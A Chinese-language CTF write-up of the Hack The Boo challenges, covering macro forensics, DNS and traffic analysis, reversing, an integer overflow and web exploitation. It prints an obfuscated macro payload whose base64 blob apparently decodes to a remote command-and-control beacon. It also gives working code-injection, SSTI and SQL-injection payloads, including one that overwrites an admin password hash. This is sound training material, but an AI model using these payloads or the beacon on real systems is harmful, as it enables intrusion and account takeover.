![在这里插入图片描述](https://img-blog.csdnimg.cn/35bf5fd8b27341e289804c1e9930310f.png)

一个入门级的ctf比赛，网站链接：
```
https://ctf.hackthebox.com/event/details/hack-the-boo-637
```
# Forensics
## 1.Halloween_Invitation
考点：
```
1.从文档中提取宏
2.对代码进行反混淆
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/354d41014c8c48888870eb379fa837a0.png)

解压zip后，可以得到一个文档，后缀名.docm的意思是，这个文档启用了宏，我们要把宏提取出来

这里使用olevba.py脚本来提取宏
```
https://github.com/decalage2/oletools/blob/master/oletools/olevba.py
```
下载好后直接运行
```
python3 olevba.py /home/kali/hacktheboo2022/forensics/halloween_invitation/invitation.docm
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/5217f1e9e06b44fc9cf8f4b4b7179cc9.png)

代码还被混淆了

![在这里插入图片描述](https://img-blog.csdnimg.cn/2a19f7f1b94c4538ad688d987b3b3922.png)

我们将这些代码复制出来

![在这里插入图片描述](https://img-blog.csdnimg.cn/6cdb13fc4620436194f3993693b8611b.png)

写一个脚本来反混淆
```
#!/usr/bin/python

def decodeAsHex(str):
    return "".join([chr(int(str[i:i+2],16)) for i in range(0, len(str), 2)])

def decodeChar(str):
    return "".join([chr(int(s)) for s in str.split(' ')])


def getBase64EncodedPayload():
    command = ""
    command = command + decodeChar(decodeAsHex("3734203635203636203132322036352036382034382036352037342031") + decodeAsHex("31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033"))
    command = command + decodeChar(decodeAsHex("363520313230203635203638203130") + decodeAsHex("37203635203739203635203635203131372036352036382038352036352037372031303320363520353420363520363820313033203635203737203635203635203532"))
    command = command + decodeChar(decodeAsHex("3635203638203635203635203734") + decodeAsHex("20313139203635203535203635203637203831203635203937203831203635203537203635203637203939203635203930203635203635203438203635203638203737"))
    command = command + decodeChar(decodeAsHex("3635203839203130332036362031303620363520373120373720363520373820313033203636203130372036352036") + decodeAsHex("37203438203635203737203635203635203438203635203638203737203635203930"))
    command = command + decodeChar(decodeAsHex("313033203635203132312036352036382038312036352037372036352036352035") + decodeAsHex("33203635203637203438203635203738203131392036362031303820363520373120363920363520373720313033203635"))
    command = command + decodeChar(decodeAsHex("313232203635203731203639203635203737203130332036362031303620363520363720393920363520373920313139203635203130372036352037322036352036352038302038312036352031") + decodeAsHex("3130203635"))
    command = command + decodeChar(decodeAsHex("373120313033203635203130302036352036362034382036352037322036352036352037392031303320") + decodeAsHex("36352031313820363520363720353620363520373420313139203635203535203635203637203831"))
    command = command + decodeChar(decodeAsHex("36352031303020313033203635203537203635203639203130372036352039382031303320363620353020363520373120353620363520393720313139203636203130382036352036372034") + decodeAsHex("38203635203835"))
    command = command + decodeChar(decodeAsHex("31303320363620313038203635203732203737203635203130302036352036362037382036352037312038352036352031303020363520363620313131203635203731203536203635203930") + decodeAsHex("203635203635"))
    command = command + decodeChar(decodeAsHex("313033203635203637203438203635203836203831203636203132322036352037312038") + decodeAsHex("35203635203831203130332036362031303420363520373220373720363520393720383120363620313036203635"))
    command = command + decodeChar(decodeAsHex("373020363520363520383920383120363620313231203635203732203737203635203937203831203636") + decodeAsHex("2031313720363520373120393920363520373320363520363520313136203635203730203835203635"))
    command = command + decodeChar(decodeAsHex("3939203130332036362031313220363520363720363520363520373420363520363620313139203635203637203831203635203939203131392036352031313820") + decodeAsHex("3635203731203831203635203738203635"))
    command = command + decodeChar(decodeAsHex("363520313232203635203731203733203635") + decodeAsHex("20383920313139203636203130362036352036382038392036352039302036352036352031303320363520363720343820363520383320363520363620313038"))
    command = command + decodeChar(decodeAsHex("36352037312036392036352039302036352036362031303820363520373220373320363520393920313139203635") + decodeAsHex("20313033203635203639203635203635203130312031313920363520313035203635203639"))
    command = command + decodeChar(decodeAsHex("363920363520313030203831203636203438203635203731203130332036352039") + decodeAsHex("38203131392036362031323120363520373120313037203635203130312031303320363620313034203635203732203831"))
    command = command + decodeChar(decodeAsHex("363520393720383120363620") + decodeAsHex("313138203635203731203532203635203733203130332036352035372036352036372038312036352039372038312036362035372036352036382031313520363520313030"))
    command = command + decodeChar(decodeAsHex("313139203636203131312036352037312031303720363520393820363520363620313038") + decodeAsHex("2036352036372036352036352037352036352036352031303720363520373220383120363520393920313033203636"))
    command = command + decodeChar(decodeAsHex("34392036352037312038352036352037352038312036362035352036352036372038312036352038392031313920363520353720363520363720313033203635203833203831203636203131") + decodeAsHex("37203635203732"))
    command = command + decodeChar(decodeAsHex("38392036352039382031313920363620313134203635203731203835203635203736203831203636203833") + decodeAsHex("20363520373120383520363520393920313139203636203438203635203639203438203635203930"))
    command = command + decodeChar(decodeAsHex("38312036362034382036352037312031303320363520393820313139203636203130372036352036372036352036352037362038312036362038362036352037322037") + decodeAsHex("37203635203930203831203636203637"))
    command = command + decodeChar(decodeAsHex("363520373120363920363520393920313139203636203131322036352037312037372036352038352036352036362031303420363520") + decodeAsHex("37322037332036352039392031313920363620313132203635203731"))
    command = command + decodeChar(decodeAsHex("35322036352039302031313920363520313033203635203637203438203635203836203831203636203132312036352037312031303720363520373320363520363520313037203635203732203635") + decodeAsHex("203635"))
    command = command + decodeChar(decodeAsHex("37342036352036362031323220363520363720") + decodeAsHex("35362036352037372036352036352034382036352036382037372036352039302031303320363520313231203635203638203831203635203737203635203635"))
    command = command + decodeChar(decodeAsHex("353320363520363720363520363520373620383120363620373320363520373120383520363520383920383120363620313037203635") + decodeAsHex("2037312038352036352039392031303320363620313232203635203637"))
    command = command + decodeChar(decodeAsHex("36352036352038312036352036362035352036352036372037332036352038") + decodeAsHex("3120383120363620343920363520373220383120363520393720363520363620313138203635203732203733203635203937"))
    command = command + decodeChar(decodeAsHex("383120363620353420363520373120363920363520") + decodeAsHex("313030203635203636203131322036352037312035362036352039382031303320363520313035203635203638203438203635203734203635203636"))
    command = command + decodeChar(decodeAsHex("31313220363520373220343820363520") + decodeAsHex("37352038312036352035352036352037312031303720363520393020313033203635203130332036352036372031303320363520373420363520363620313036203635"))
    command = command + decodeChar(decodeAsHex("3637") + decodeAsHex("20363520363520373620383120363620313137203635203731203835203635203733203635203635203131302036352036392035322036352039382031313920363620313137203635203731203835"))
    command = command + decodeChar(decodeAsHex("363520373420313139203635203131322036352036372036352036352031303120313139203635203130372036352037322037332036352038302038312036362031313220363520") + decodeAsHex("373120383520363520313031"))
    command = command + decodeChar(decodeAsHex("36352036352031303320") + decodeAsHex("363520363720383120363520383920313139203635203130332036352036372034382036352038322038312036362031323120363520373220373320363520393820313139203636"))
    command = command + decodeChar(decodeAsHex("3132312036352036392036392036352038392031313920363620343820363520373120313037203635203938203131392036362031313720363520") + decodeAsHex("363720363520363520383520313139203636203438203635"))
    command = command + decodeChar(decodeAsHex("3731203536203635203939203635203635203130332036352036372034382036352038322038312036362031323120") + decodeAsHex("36352037322037332036352039382031313920363620313231203635203730203839"))
    command = command + decodeChar(decodeAsHex("363520383920383120363620313231203635203731203130372036352038392038") + decodeAsHex("31203636203130352036352037312031313920363520393020383120363520313033203635203731203835203635203739"))
    command = command + decodeChar(decodeAsHex("3131392036352031303720363520373220373320363520383020383120") + decodeAsHex("3636203830203635203732203835203635203130302036352036352031313620363520373020373720363520313030203635203636"))
    command = command + decodeChar(decodeAsHex("3132312036352037") + decodeAsHex("31203130372036352039382031303320363620313130203635203637203635203635203736203831203636203734203635203731203532203635203939203635203636203439203635"))
    command = command + decodeChar(decodeAsHex("37322038312036352038342031313920363620313035203635203731203131312036352039302038312036362031303620363520373220383120363520373320363520363520313037203635203732") + decodeAsHex("203733"))
    command = command + decodeChar(decodeAsHex("3635203739203131392036352031303720363520373220383120363520383020383120363620") + decodeAsHex("373420363520373120353220363520313030203130332036362031313820363520373120313135203635203930"))
    command = command + decodeChar(decodeAsHex("38312036352031313620363520373020373320363520393020383120363620313232203635203732203831203635203834203831203636203130") + decodeAsHex("3820363520373220383120363520393720363520363620313138"))
    command = command + decodeChar(decodeAsHex("3635203731203831203635203733") + decodeAsHex("20363520363520313136203635203730203835203635203939203130332036362031313220363520363720363520363520373420363520363620313139203635203637"))
    command = command + decodeChar(decodeAsHex("3831203635203939203131392036352031313820363520363820393920363520393020383120363620313034203635203638203733203635203737203131392036362031303420363520363820373320") + decodeAsHex("3635"))
    command = command + decodeChar(decodeAsHex("38392031313920363520313033203635203637203438203635203834203831203636203130382036352037322038312036352039372036352036362031313820363520373120") + decodeAsHex("3831203635203733203635"))
    command = command + decodeChar(decodeAsHex("363620383120") + decodeAsHex("36352036392035362036352038352031313920363620383520363520363720363520363520373620383120363620373320363520373120383520363520383920383120363620313037203635"))
    command = command + decodeChar(decodeAsHex("37312038352036352039392031303320363620313232203635203637203635203635203831203635203636203535") + decodeAsHex("203635203637203733203635203831203831203636203439203635203732203831203635"))
    command = command + decodeChar(decodeAsHex("3937203635203636203131382036352037322037332036352039372038312036362035342036352037312036392036352031303020363520363620313132203635203731203536203635203938") + decodeAsHex("20313033"))
    command = command + decodeChar(decodeAsHex("3635203130352036352036382034382036352037342036352036362031313220363520373220343820363520373320363520363520") + decodeAsHex("3131362036352036392037332036352039382031313920363620313037"))
    command = command + decodeChar(decodeAsHex("363520373220") + decodeAsHex("3130372036352037332036352036352031313120363520373020313135203635203835203131392036362035332036352037322037372036352031303020363520363620313038203635203731"))
    command = command + decodeChar(decodeAsHex("3438203635") + decodeAsHex("203736203130332036362038352036352037312038352036352031303120363520363620343820363520363720353220363520383220383120363620313137203635203731203737203635203938"))
    command = command + decodeChar(decodeAsHex("3131392036362031303720363520373120313037203635203938203130332036362031313020363520373020343820363520373920313033203635203534203635203730203835203635") + decodeAsHex("203836203635203636"))
    command = command + decodeChar(decodeAsHex("37312036352036382031303320363520373620313033203636203732203635203731") + decodeAsHex("20383520363520313030203635203636203637203635203732203130372036352031303020363520363620313038203635"))
    command = command + decodeChar(decodeAsHex("3732203737203635203735203635203635203130372036352037312038352036352037352031313920363520313037203635203732203733203635203735203831203635") + decodeAsHex("20313033203635203637203438"))
    command = command + decodeChar(decodeAsHex("36352039372031303320363620") + decodeAsHex("3131382036352037312031303720363520393820313033203635203130332036352036372039392036352037332036352036352031313020363520363720313037203635"))
    command = command + decodeChar(decodeAsHex("313032") + decodeAsHex("20383120363520313033203635203732203737203635203938203635203636203130382036352037312038352036352039392036352036352031303320363520363820363520363520373620313033"))
    command = command + decodeChar(decodeAsHex("363520353220363520373220343820363520383320363520363620") + decodeAsHex("3835203635203639203733203635203130312031313920363520343920363520373220383520363520393920363520363520313232203635"))
    command = command + decodeChar(decodeAsHex("373220373320363520383820313139203635203132322036352036382038312036352037382038") + decodeAsHex("31203636203533203635203730203536203635203938203831203635203438203635203731203737203635"))
    return command + decodeChar(decodeAsHex("393920313033203635203131392036352036382038352036352031303220383120") + decodeAsHex("3635203631"))

print(getBase64EncodedPayload())
```




![在这里插入图片描述](https://img-blog.csdnimg.cn/7ee2762c37654da5a5e9ac8b85739093.png)
运行脚本后，可以看到base64加密后的密文，我们解密



```
echo "JABzAD0AJwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAZAA0ADMAYgBjAGMANgBkAC0AMAA0ADMAZgAyADQAMAA5AC0ANwBlAGEAMgAzAGEAMgBjACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGQANAAzAGIAYwBjADYAZAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMAA0ADMAZgAyADQAMAA5ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADcAZQBhADIAMwBhADIAYwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0ASABUAEIAewA1AHUAcAAzAHIAXwAzADQANQB5AF8AbQA0AGMAcgAwADUAfQA=" | base64 -d
```
得到flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/359871996bfd442fa33e6e3730a634b9.png)

```
HTB{5up3r_345y_m4cr05}
```
## 2.TrickOrBreach
考点：
```
1.DNS流量分析
```
双击打开流量包

![在这里插入图片描述](https://img-blog.csdnimg.cn/d6a3fcf24f0b4694b2dbc878c5d6c892.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/06a185d5cde14f5891098d91cc3396a1.png)

发现都是dns的流量，通过strings工具发现了很多十六进制

![在这里插入图片描述](https://img-blog.csdnimg.cn/1069ab24aaec48eaa35c22ae7789fb61.png)

我们把这些十六进制导出来
```
tshark -r capture.pcap -T fields -e dns.qry.name > a.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/cfc8db2105af4dba93e5d65c843adedd.png)

用文本编辑器把.pumpkincorp.com字符去掉

![在这里插入图片描述](https://img-blog.csdnimg.cn/492d168aab2d41a5a271718f2946947b.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/63d311a1a78a430bbae6e807fa3e7084.png)

然后再用uniq工具将重复的字符串去掉
```
cat a.txt| uniq > b.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/be458fd63b944478a9496b759a45713d.png)


将十六进制转换为ascii码可以发现，这是一个Excel 文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/bd1e9f1d7fda4aea8378badaafda6146.png)

导入unzip模块就能找到flag


![在这里插入图片描述](https://img-blog.csdnimg.cn/7913db8312e7459fbcc95c16366a1319.png)


```
HTB{M4g1c_c4nn0t_pr3v3nt_d4t4_br34ch}
```
## 3.Wrong_Spooky_Season
考点：
```
1.流量分析
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/7e58997c33324afab909506091793224.png)

双击打开流量包

![在这里插入图片描述](https://img-blog.csdnimg.cn/4788551f71bc4c4faf9cca162479d58b.png)

查看流量包协议分级


![在这里插入图片描述](https://img-blog.csdnimg.cn/4d63d781b77145d49197bbce998233c6.png)

选择data数据

![在这里插入图片描述](https://img-blog.csdnimg.cn/8021e1e5b799445db6ec9ee3290177c6.png)

跟踪流量包可以发现一串base64密文

![在这里插入图片描述](https://img-blog.csdnimg.cn/00a3c4aafb24458eae2af3fdb5774930.png)

是倒转过来的，我们转回去即可
```
echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/54356280076e425eb274fcaac695c601.png)

得到flag
```
HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
```
或者直接用strings工具查看流量包里的字符串
```
strings capture.pcap
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6add568eb16b43ef89bc2cb3fb80ab12.png)
# Reversing

## 1.Cult_Meeting
分析程序，发现是64位的，我们直接用ida来静态分析

![在这里插入图片描述](https://img-blog.csdnimg.cn/e417215a3900440c9231565ab8b3b54a.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/a90eb31d105a4b4f8ba8874d5501b045.png)

```
char s[64]; // [rsp+0h] [rbp-40h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("\x1B[3mYou knock on the door and a panel slides back\x1B[0m");
  puts(asc_2040);
  fwrite("\"What is the password for this week's meeting?\" ", 1uLL, 0x30uLL, _bss_start);
  fgets(s, 64, stdin);
  *strchr(s, 10) = 0;
  if ( !strcmp(s, "sup3r_s3cr3t_p455w0rd_f0r_u!") )
  {
    puts("\x1B[3mThe panel slides closed and the lock clicks\x1B[0m");
    puts("|      | \"Welcome inside...\" ");
    system("/bin/sh");
  }
  else
  {
    puts("   \\/");
    puts(asc_2130);
  }
```
```
  if ( !strcmp(s, "sup3r_s3cr3t_p455w0rd_f0r_u!") )
  	……
  	system("/bin/sh");
  	……
```
最关键的是if判断这里，他会将我们输入的字符和sup3r_s3cr3t_p455w0rd_f0r_u!字符串做比较。如果一样就会给我们一个shell

我们直接输入sup3r_s3cr3t_p455w0rd_f0r_u!即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/4e273ded995e4c89a25c7bd13f997c88.png)

成功得到flag
```
HTB{1nf1ltr4t1ng_4_cul7_0f_str1ng5}
```
## 2.EncodedPayload
![在这里插入图片描述](https://img-blog.csdnimg.cn/76a650b4ca004973bcd91306e1cddea8.png)

这是一个32位的程序，但是运行时什么也不输出，我们用strace来跟踪文件的系统调用
```
strace ./encodedpayload
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/430d371e9bee4cf69e152278992f46df.png)

成功得到flag
```
HTB{PLz_strace_M333}
```
## 3.Ghost_Wrangler
![在这里插入图片描述](https://img-blog.csdnimg.cn/0cf536bb7b794e19be1ec1acf98cc319.png)

这是一个64位的程序，我们用ida打开来静态分析

![在这里插入图片描述](https://img-blog.csdnimg.cn/652b7450fe78418883fba47f3a88e69f.png)

```
const char *flag; // [rsp+8h] [rbp-8h]

  flag = (const char *)get_flag(argc, argv, envp);
  printf(
    "%s\r|\x1B[4m%*.c\x1B[24m| I've managed to trap the flag ghost in this box, but it's turned invisible!\n"
    "Can you figure out how to reveal them?\n",
    flag,
    40,
    95LL);
  return 0;
```

很简单的程序，他会把flag载入，到时候我们直接看程序的堆栈就好了

用gdb运行程序，我们在main函数地址处下一个断点，慢慢执行


![在这里插入图片描述](https://img-blog.csdnimg.cn/77c351465d7c4bda8b418604c187af23.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/1245252adde64bd9a1eed76e026ce2df.png)

在执行了call指令后，可以得到flag
```
HTB{h4unt3d_by_th3_gh0st5_0f_ctf5_p45t!}
```
## 4.Ouija

![在这里插入图片描述](https://img-blog.csdnimg.cn/e9ef1d2e29c4418db1fb5edef951f926.png)

这是一个64位的程序，继续用ida打开来静态分析

![在这里插入图片描述](https://img-blog.csdnimg.cn/324e2378263a4f0d97ed31a83bc3ad23.png)

在最上面可以看到一串奇怪的字符

![在这里插入图片描述](https://img-blog.csdnimg.cn/4feeda1725264abbba0804d01276456c.png)

然后对这个字符串进行了一些操作，通过分析，只是简单的置换字符串，我们使用ROT13就能得到flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/6823f82215764ca5ab4f32ec97baeb32.png)


```
HTB{Adding_sleeps_to_your_code_makes_it_easy_to_optimize_later!}
```


## 5.Secured_transfer
![在这里插入图片描述](https://img-blog.csdnimg.cn/64fc29e08e3042f9a39223c9c4fbe6a2.png)

有一个程序和流量包，我们双击打开流量包

![在这里插入图片描述](https://img-blog.csdnimg.cn/5c57e6dcdf454365b0f6ee171912d8b8.png)


只是几条tcp的交互，但是有一条带有FIN、PSH和ACK的流量，而且下面还有加密的数据字符串

![在这里插入图片描述](https://img-blog.csdnimg.cn/190f293078b241f29bf709021b16cdb6.png)


```
5f558867993dccc99879f7ca39c5e406972f84a3a9dd5d48972421ff375cb18c
```

分析程序，发现是64位的，直接用ida打开分析

![在这里插入图片描述](https://img-blog.csdnimg.cn/baead1a5935247758c58a8ec98313f1f.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/8a8eb646e2814f49a378690c8b4ef520.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/ec7bff15ee314485ba0b7bcb51f9614b.png)

这个程序只是监听端口，然后传输文件的，但是在一个函数里，发现了加密的密钥

![在这里插入图片描述](https://img-blog.csdnimg.cn/993e35cae5fa409794b1faa741327087.png)

用AES解密就能得到flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/253c38a6efdc4ea783139e51379b8f91.png)

```
HTB{vryS3CuR3_F1L3_TR4nsf3r}
```
# PWN
## 1.Pumpkin_Stand
![在这里插入图片描述](https://img-blog.csdnimg.cn/9beec01672df4f12af36aaf043f97cbb.png)

打开ida，进行静态分析

![在这里插入图片描述](https://img-blog.csdnimg.cn/79f0af6d0e4c4c9087f016bc1acefad9.png)

首先打开了菜单，将我们的输入存入v3变量中，然后问我们需要多少个，将值存入v4里

![在这里插入图片描述](https://img-blog.csdnimg.cn/863885f25af249bbbf8a3a2dd4ca76b7.png)

然后pumpcoins数是减去我们输入的两个值的乘积，但是这行代码会导致整数溢出漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/5c6fd474c2a644b680794c3cfcb7a725.png)


当逻辑假定结果值将始终大于原始值时，软件执行的计算可能会产生整数溢出


如果我们输入1，就不会进入flag模块里，所以我们不能输入1

![在这里插入图片描述](https://img-blog.csdnimg.cn/63b262878a3448c7a1fe8be4adb59016.png)

pumpcoins > 9998就会输出flag

运行程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/bbb7fb0350324c479fa6fdb88f459b35.png)

选择2

![在这里插入图片描述](https://img-blog.csdnimg.cn/7fd58f473873408a8336be729a2af49f.png)

只要输入足够大的数字，就会触发漏洞，获得flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/3ab3f33bb5534584846d6280041248b1.png)

获得flag
# Web
## 1.Evaluation_Deck

访问网站，发现只是一个小游戏

![在这里插入图片描述](https://img-blog.csdnimg.cn/a57aa94726ad41dba340e4c617b46f49.png)

启动burp，然后随便点击一张牌

![在这里插入图片描述](https://img-blog.csdnimg.cn/355133f8fd4c428e882fb6aeb71bff15.png)

在下面有一些参数，怪物的血量是100，我们-54

![在这里插入图片描述](https://img-blog.csdnimg.cn/59efa3386744438d89325f4226e854ce.png)

刷新网页，我们改一下造成的伤害试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/758d3cb29c6f46f79f7de751f2d67ac2.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/5388950f52d04501b2591180640fc2eb.png)

赢了，但是什么也没弹出来

![在这里插入图片描述](https://img-blog.csdnimg.cn/6a5f70ad42f949c182aa31c0ad92d1b2.png)

通过分析源代码可以知道，我们可以利用operator参数来执行命令

```
\nimport subprocess as sp\nresult=sp.getoutput('cat ../flag.txt')\ny =
```

执行payload，获得flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/10e26e5a87904b3e8d97ccf516637e70.png)


## 2.Spookifier
打开网站，有一个输入框，我们随便输入一些东西

![在这里插入图片描述](https://img-blog.csdnimg.cn/5e2df12268de4ffa93a8b78a447f831e.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/55ea2bad3d454359a4f7b4f38bf6aecb.png)

他会获取我们的输入，然后再输出

通过分析源码可以发现

![在这里插入图片描述](https://img-blog.csdnimg.cn/dec522a6214c4092adc43b29199a53f0.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/232d458a723e490f8a79e6f8af5e20d5.png)

我们的输入直接传到了里面，没有经过检查，这样会导致ssti漏洞

我们测试一下存不存在ssti漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/2a2fd2871008482186c19cb7494dd291.png)

漏洞存在，我们直接获取flag即可

```
${self.module.cache.util.os.popen("cat ../flag.txt").read()}
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/057e5e2ceab54da69adf66f079b7b03b.png)
## 3.Horror_Feeds
去到网站上，发现是一个登录页面

![在这里插入图片描述](https://img-blog.csdnimg.cn/15c5296b71704f21a4224f99cf359624.png)


我们分析一下源代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/16deea243add4989a64973efb07284f9.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/d16c6921c93d4d998e450b4e6004a7b9.png)

只有当我们是admin用户登录的时候，才能看到源代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/ae091c60d39b420b975ffc7bcd2815aa.png)


我们输入的用户名直接带到数据库里查询了，这会造成sql注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/cedf5ce930a04eed80f65135fb4fa4be.png)

由于这个查询没有检查我们输入的字符串，我们将管理员的密码哈希更改为我们自己生成的哈希

![在这里插入图片描述](https://img-blog.csdnimg.cn/b7adbd17fc094a70b1c2ab87a0bbb12e.png)


密码是经过hash处理的，我们更改的密码也要生成这种hash值

![在这里插入图片描述](https://img-blog.csdnimg.cn/4f423dbcf6894f03b1b5d147be8afe32.png)

然后注入username参数，更改管理员密码哈希值



```
{"username":"admin\",\"$2a$12$m5lXqzyKreZcVbB/sxR1rOJGbyo.7oHWwI83x8N31/LDCTNhzOhp2") ON DUPLICATE KEY UPDATE password=\"$2a$12$m5lXqzyKreZcVbB/sxR1rOJGbyo.7oHWwI83x8N31/LDCTNhzOhp2"#"}
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/414092194709444b8cafa93b4cebcf9f.png)


更改成功，登录即可看到flag


## 4.Juggling_Facts
打开网站

![在这里插入图片描述](https://img-blog.csdnimg.cn/af712c5a57464d7fad16f68cee958841.png)

只有右边这三个按键能用，点击secret facts按键，网站显示需要admin用户才能看

![在这里插入图片描述](https://img-blog.csdnimg.cn/f2b57f0159a64e20986e9445df30de9c.png)

查看源代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/27f10f55066444d99fd3f2a36f775dca.png)

PHP有一个type juggling的功能，php在比较不同类型的变量时，会首先将它们转换为一个通用的可比较的类型

![在这里插入图片描述](https://img-blog.csdnimg.cn/9ff16d0e405c47d09999fca50a3e81f2.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/43553bfd132b4aa2ad4170f00544397e.png)

文章网站：

```
https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09
```
简单来说就是
```
"a"=="a"  -> true
"a"==true -> true
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/d050e5830d6442168a3fca84d22735af.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/bb118bffc24e4a64a3fb2a400c1639bc.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/77ab7dc774134ad1946e5b7e80e23d36.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/85f186b68d7c48ce8882b381f738fb39.png)


我们直接发送true即可获得flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/e6705a0a65e9462da84aebd389b5d6d0.png)
